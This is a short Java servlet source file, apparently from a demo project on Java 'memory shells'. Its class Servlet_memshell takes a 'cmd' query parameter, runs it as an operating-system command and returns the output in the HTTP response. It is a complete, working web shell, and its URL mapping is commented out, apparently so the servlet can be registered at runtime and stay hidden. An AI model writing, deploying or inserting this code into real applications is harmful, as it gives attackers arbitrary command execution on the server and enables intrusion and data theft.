// src/main/java/example/demo/Servlet_memshell.jsp
package example.demo;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

// @WebServlet(
//         name = "Servlet_memshell",
//         urlPatterns = "/servlet"
// )
public class Servlet_memshell extends HttpServlet {
    private String message;

    public void init() {
        message = "Servlet 命令执行输出：\n";
    }

    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if(cmd != null) {
            try {
                InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();
                BufferedInputStream bins = new BufferedInputStream(ins);
                resp.setContentType("text/html;charset=UTF-8");
                resp.getWriter().write(message);
                int len;
                while ((len = bins.read()) != -1) {
                    resp.getWriter().write(len);
                }
            }catch (Exception e){
                resp.getWriter().println(e.getMessage());
            }
        }
    }

    public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
